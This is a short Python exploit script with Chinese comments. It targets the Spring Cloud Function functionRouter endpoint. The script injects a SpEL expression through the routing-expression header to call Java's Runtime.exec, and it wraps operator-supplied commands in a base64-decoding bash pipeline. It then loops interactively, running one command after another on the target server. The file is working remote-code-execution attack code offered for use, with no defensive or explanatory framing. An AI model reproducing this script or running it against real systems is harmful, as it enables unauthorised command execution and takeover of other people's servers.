#!/usr/bin/env python3
# writer: yuej0nj1an

import requests
import base64
import colorama

def exploit(target,cmd):
    url = '{}/functionRouter'.format(target)
    print(url)
    cmd = convert_payload(cmd)
    print(cmd)
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Connection': 'close',
        'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("'+ cmd +'")'
    }
    data = 'Test'
    try:
        response = requests.post(url, headers=headers, data=data.encode('utf-8'))
    except Exception as e:
        print(colorama.Fore.RED + '[error] 发生错误：{}'.format(e))
    # 检查响应
    if response.status_code == 200:
        print("[info] 请求利用成功!")
        print("[info] 响应内容:")
        print(response.text)
    else:
        print(response.text)
        print("[info] 请求失败.")

def convert_payload(cmd):
    cmd = base64.b64encode(cmd.encode('utf-8')).decode('utf-8')
    return "bash -c {echo,"+ cmd +"}|{base64,-d}|{bash,-i}"

if __name__ == '__main__':
    target = input("请输入你的target: ")
    cmd = input("请输入你要执行的cmd: ")
    while True:
        print(colorama.Fore.GREEN + "[info] 开始利用")
        exploit(target, cmd)
        cmd = input("请输入你要执行的下一个cmd: ")